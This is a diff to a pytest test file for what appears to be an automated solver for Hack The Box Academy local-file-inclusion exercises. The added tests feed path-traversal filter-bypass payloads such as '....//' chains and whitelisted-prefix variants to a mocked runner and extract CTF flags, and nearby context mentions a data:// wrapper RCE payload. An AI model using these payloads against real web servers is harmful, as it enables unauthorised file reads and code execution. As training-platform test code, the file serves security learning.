@@ -18,6 +18,7 @@ import pytest
 
 from htbrl.academy.lfi_runner import (
     LfiAttempt,
+    probe_via_lfi,
     try_data_wrapper_rce,
     try_lfi_read,
 )
@@ -203,3 +204,80 @@ def test_data_wrapper_rce_threads_command_output_through():
     assert "uid=33" in out
     assert attempt.technique == "data-wrapper-rce"
     assert attempt.payload.startswith("data://text/plain,")
+
+
+# ---- probe_via_lfi: question-pattern dispatcher ----------------------------
+
+
+def test_probe_via_lfi_recognises_filter_bypass_prompt():
+    """LFI-shaped prompt + flag-leaking response -> answer surfaced."""
+    flag = "HTB{f1lt3r_byp4ss_w1n}"
+    runner = _Recorder(
+        routes={
+            "....//....//....//....//flag.txt": _wrap(f"the flag {flag}"),
+        },
+    )
+    result = probe_via_lfi(
+        runner,
+        "Try to bypass these filters to read /flag.txt",
+    )
+    assert result is not None
+    answer, rationale, conf = result
+    assert answer == flag
+    assert conf == pytest.approx(0.90)
+    assert "LFI bypass" in rationale
+
+
+def test_probe_via_lfi_returns_none_on_unrelated_prompt():
+    """If the prompt doesn't look like LFI, we don't fire any payloads."""
+    runner = _Recorder()
+    result = probe_via_lfi(runner, "What is the HTTP method used in this request?")
+    assert result is None
+    # No HTTP requests issued because we bailed out early.
+    assert runner.calls == []
+
+
+def test_probe_via_lfi_uses_param_hint_from_code_blocks():
+    """When the section's example URL uses ``?file=`` we try ``file``,
+    not the default ``language``."""
+    flag = "HTB{file_param_w0rks}"
+    runner = _Recorder(
+        routes={
+            "file=....//....//....//....//flag.txt": _wrap(flag),
+        },
+    )
+    result = probe_via_lfi(
+        runner,
+        "Read /flag.txt using LFI on the target.",
+        section_code_blocks=["GET /index.php?file=lang/en.php"],
+    )
+    assert result is not None
+    assert result[0] == flag
+
+
+def test_probe_via_lfi_detects_approved_prefix_in_examples():
+    """When the example shows ``language=languages/en.php`` the probe
+    learns that ``languages/`` is the whitelisted prefix and tries
+    prefix-anchored bypass variants."""
+    flag = "HTB{prefix_anchored_w0rk}"
+    runner = _Recorder(
+        routes={
+            "languages/" + "....//" * 4 + "flag.txt": _wrap(flag),
+        },
+    )
+    result = probe_via_lfi(
+        runner,
+        "Use LFI to read /flag.txt by bypassing the filter.",
+        section_code_blocks=["index.php?language=languages/en.php"],
+    )
+    assert result is not None
+    assert result[0] == flag
+
+
+def test_probe_via_lfi_returns_none_when_no_payload_works():
+    """Recognised LFI prompt but every payload returns blank -> None."""
+    runner = _Recorder()
+    result = probe_via_lfi(runner, "Read /flag.txt via LFI bypass.")
+    assert result is None
+    # We DID try payloads (the prompt matched) so calls is non-empty.
+    assert len(runner.calls) > 0
